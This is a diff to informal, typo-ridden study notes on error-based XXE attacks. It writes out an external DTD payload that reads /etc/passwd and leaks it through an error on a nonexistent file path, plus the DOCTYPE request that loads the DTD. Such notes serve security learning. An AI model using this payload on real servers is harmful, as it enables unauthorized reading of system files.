@@ -19,12 +19,16 @@ sometimes /etc/password may not work as it may have multiple lines with newline 
 this method alsso uses external dtd to cause errror by storing inclusi=ding non existsnace file in xxe
 
 eg:
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "file:///etc/passwd">     -----> file to retrieve
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">    -------> non existence file is used
 %eval;
 %exfil;
 
 request:
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
-that should acuse some error which may give info disclosure
+that should acuse some error which may give info disclosure or the file specified
+
+
+
+3.
 
